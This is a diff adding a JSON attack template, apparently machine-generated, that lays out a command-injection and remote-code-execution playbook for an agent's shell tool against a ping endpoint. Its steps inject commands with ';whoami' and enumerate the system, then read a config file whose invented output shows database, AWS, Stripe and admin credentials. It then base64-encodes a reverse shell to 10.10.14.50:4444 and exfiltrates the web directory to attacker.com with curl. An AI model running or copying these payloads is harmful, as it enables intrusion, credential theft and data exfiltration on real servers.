@@ -1,0 +1,133 @@
+{
+  "name": "command_injection_rce",
+  "description": "Command injection and Remote Code Execution (RCE) attacks",
+  "pattern": "command.*injection|rce|remote.*code.*execution|shell.*injection",
+  "parameters": [
+    "target_url",
+    "injection_point",
+    "command"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/ping.php?host=127.0.0.1",
+          "-v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> GET /ping.php?host=127.0.0.1 HTTP/1.1\n> Host: target.com\n> \n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=UTF-8\n< \n<!DOCTYPE html>\n<html>\n<head><title>Network Ping Tool</title></head>\n<body>\n  <h1>Ping Results</h1>\n  <pre>\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.035 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.042 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.038 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3056ms\nrtt min/avg/max/mdev = 0.027/0.035/0.042/0.006 ms\n  </pre>\n</body>\n</html>\n\nPing functionality identified:\n  Endpoint: /ping.php\n  Parameter: host (GET)\n  Function: Executes ping command on server\n  Output: Full ping command output in HTML\n  \nLikely server-side code (PHP):\n  <?php\n  $host = $_GET['host'];\n  $output = shell_exec(\"ping -c 4 \" . $host);\n  echo \"<pre>\" . $output . \"</pre>\";\n  ?>\n  \nVulnerability: Command injection\n  User input directly in shell_exec()\n  No input validation/sanitization\n  \nTesting for command injection..."
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/ping.php?host=127.0.0.1;whoami"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<!DOCTYPE html>\n<html>\n<head><title>Network Ping Tool</title></head>\n<body>\n  <h1>Ping Results</h1>\n  <pre>\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.038 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.029 ms\n64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.033 ms\n\n--- 127.0.0.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3067ms\nrtt min/avg/max/mdev = 0.029/0.032/0.038/0.003 ms\nwww-data\n  </pre>\n</body>\n</html>\n\nCommand injection confirmed!\n  Payload: 127.0.0.1;whoami\n  Separator: ; (command separator)\n  Injected command: whoami\n  Output: www-data\n  \nCommand executed successfully!\n  Executed: ping -c 4 127.0.0.1;whoami\n  Result: Both commands executed\n    1. ping 127.0.0.1\n    2. whoami → www-data\n  \nCommand injection operators:\n  - ; (semicolon): cmd1;cmd2\n  - && (AND): cmd1 && cmd2 (executes cmd2 if cmd1 succeeds)\n  - || (OR): cmd1 || cmd2 (executes cmd2 if cmd1 fails)\n  - | (pipe): cmd1 | cmd2\n  - ` (backtick): cmd1 `cmd2`\n  - $() (substitution): cmd1 $(cmd2)\n  - & (background): cmd1 & cmd2"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/ping.php?host=127.0.0.1;id;uname -a;pwd"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<!DOCTYPE html>\n<html>\n<head><title>Network Ping Tool</title></head>\n<body>\n  <h1>Ping Results</h1>\n  <pre>\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n[... ping output ...]\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux web-server 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n/var/www/html\n  </pre>\n</body>\n</html>\n\nMultiple commands executed:\n  1. ping 127.0.0.1 → successful\n  2. id → uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  3. uname -a → Linux web-server 5.15.0-58-generic #64-Ubuntu SMP\n  4. pwd → /var/www/html\n  \nSystem information gathered:\n  User: www-data (uid=33)\n  OS: Ubuntu Linux\n  Kernel: 5.15.0-58-generic\n  Architecture: x86_64\n  Working directory: /var/www/html\n  \nNext enumeration:\n  - List files: ;ls -la\n  - Read files: ;cat /etc/passwd\n  - Network info: ;ifconfig;netstat -tulpn\n  - Process list: ;ps aux"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo '127.0.0.1;cat /var/www/html/config.php' | jq -sRr @uri"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "127.0.0.1%3Bcat%20%2Fvar%2Fwww%2Fhtml%2Fconfig.php%0A\n\nURL-encoded payload:\n  Original: 127.0.0.1;cat /var/www/html/config.php\n  Encoded: 127.0.0.1%3Bcat%20%2Fvar%2Fwww%2Fhtml%2Fconfig.php\n  \nURL encoding breakdown:\n  ; → %3B\n  (space) → %20\n  / → %2F\n  \nUsing encoded payload:\n  curl 'http://target.com/ping.php?host=127.0.0.1%3Bcat%20%2Fvar%2Fwww%2Fhtml%2Fconfig.php'"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/ping.php?host=127.0.0.1%3Bcat%20%2Fvar%2Fwww%2Fhtml%2Fconfig.php"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<!DOCTYPE html>\n<html>\n<head><title>Network Ping Tool</title></head>\n<body>\n  <h1>Ping Results</h1>\n  <pre>\n[... ping output ...]\n\n<?php\n// Database configuration\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'shop_db');\ndefine('DB_USER', 'db_admin');\ndefine('DB_PASS', 'DbP@ssw0rd2024!');\n\n// AWS credentials\ndefine('AWS_ACCESS_KEY', 'AKIAIOSFODNN7EXAMPLE');\ndefine('AWS_SECRET_KEY', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');\ndefine('AWS_BUCKET', 's3-production-data');\n\n// API keys\ndefine('STRIPE_SECRET_KEY', 'sk_live_51HqF2gABC123XYZ789');\ndefine('SENDGRID_API_KEY', 'SG.1a2b3c4d5e6f.7g8h9i0j1k2l3m4n5o6p');\n\n// Admin credentials\ndefine('ADMIN_USER', 'superadmin');\ndefine('ADMIN_PASS', 'SuperAdmin2024!');\n?>\n  </pre>\n</body>\n</html>\n\nSensitive data exfiltrated via command injection!\n  File: /var/www/html/config.php\n  Method: Command injection → cat command\n  \nCredentials harvested:\n  Database:\n    Host: localhost\n    Database: shop_db\n    User: db_admin\n    Password: DbP@ssw0rd2024!\n  \n  AWS:\n    Access Key: AKIAIOSFODNN7EXAMPLE\n    Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n    Bucket: s3-production-data\n  \n  API Keys:\n    Stripe: sk_live_51HqF2gABC123XYZ789\n    SendGrid: SG.1a2b3c4d5e6f.7g8h9i0j1k2l3m4n5o6p\n  \n  Admin:\n    User: superadmin\n    Password: SuperAdmin2024!\n  \nEscalation paths:\n  - Database access with db_admin credentials\n  - AWS account access\n  - Payment system access (Stripe)\n  - Admin panel access"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "# Start listener\nnc -nlvp 4444 &\nLISTENER_PID=$!\necho \"Listener started (PID: $LISTENER_PID)\"\nsleep 1\n\n# Send reverse shell payload\nREVSHELL='bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'\nENCODED=$(echo $REVSHELL | base64)\necho \"Encoded payload: $ENCODED\"\n\ncurl \"http://target.com/ping.php?host=127.0.0.1;echo+${ENCODED}|base64+-d|bash\"\n\nsleep 2\necho \"\\nChecking connection...\"\nps aux | grep nc"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Listener started (PID: 12345)\nListening on 0.0.0.0 4444\n\nEncoded payload: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDQ0IDA+JjEK\n\n<!DOCTYPE html>\n[... HTML response ...]\n\nConnection received on 192.168.1.100 52341\n\nChecking connection...\nuser     12345  0.0  0.0  12856  3428 ?        S    14:45   0:00 nc -nlvp 4444\nuser     12346  0.0  0.0  12856  3428 ?        S    14:45   0:00 nc -nlvp 4444\n\nReverse shell established!\n  Listener: 10.10.14.50:4444\n  Victim: 192.168.1.100:52341\n  \nPayload breakdown:\n  1. Base64 encode reverse shell command:\n     bash -i >& /dev/tcp/10.10.14.50/4444 0>&1\n     → YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDQ0IDA+JjEK\n  \n  2. Inject command:\n     127.0.0.1;echo YmFzaC... | base64 -d | bash\n  \n  3. Execution:\n     - echo outputs base64 string\n     - base64 -d decodes it\n     - bash executes decoded command\n     - Reverse shell connects back\n  \nInteractive shell obtained:\n  www-data@web-server:/var/www/html$ whoami\n  www-data\n  \n  www-data@web-server:/var/www/html$ id\n  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  \nBypass technique:\n  Base64 encoding bypasses:\n    - WAF keyword detection\n    - Special character filtering\n    - Command blacklists"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-X",
+          "POST",
+          "http://target.com/api/backup",
+          "-H",
+          "Content-Type: application/json",
+          "-d",
+          "{\"filename\":\"backup.tar.gz\",\"compression\":\"tar czf /tmp/backup.tar.gz /var/www/html && curl http://attacker.com/exfil -d @/tmp/backup.tar.gz\"}"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n  \"status\": \"success\",\n  \"message\": \"Backup created successfully\",\n  \"details\": {\n    \"filename\": \"backup.tar.gz\",\n    \"size\": \"15728640\",\n    \"location\": \"/tmp/backup.tar.gz\",\n    \"compression_output\": \"tar: Removing leading `/' from member names\\n/var/www/html/\\n/var/www/html/index.php\\n/var/www/html/config.php\\n/var/www/html/admin/\\n[... 250+ files compressed ...]\"\n  }\n}\n\n[On attacker server]\nattacker@kali:~$ nc -nlvp 80\nListening on 0.0.0.0 80\nConnection received on 192.168.1.100 43218\nPOST /exfil HTTP/1.1\nHost: attacker.com\nContent-Length: 15728640\nContent-Type: application/x-www-form-urlencoded\n\n[... 15MB of compressed data ...]\n\nData exfiltration via command injection!\n  Endpoint: /api/backup\n  Parameter: compression (accepts user input)\n  \nInjected command chain:\n  1. tar czf /tmp/backup.tar.gz /var/www/html\n     → Create compressed archive of entire web directory\n  \n  2. && curl http://attacker.com/exfil -d @/tmp/backup.tar.gz\n     → Send backup to attacker server via HTTP POST\n  \nExfiltrated data:\n  - Source code (PHP files)\n  - Configuration files (credentials)\n  - Database dumps\n  - User uploads\n  - Admin files\n  Size: 15MB compressed\n  \nExtract on attacker machine:\n  tar xzf backup.tar.gz\n  \nAlternative exfiltration methods:\n  - SCP: scp /tmp/backup.tar.gz user@attacker.com:/tmp/\n  - Base64 + HTTP: base64 /tmp/backup.tar.gz | curl -d @- http://attacker.com/\n  - DNS exfiltration: For small data, encode in DNS queries\n  - ICMP exfiltration: Encode data in ping packets"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
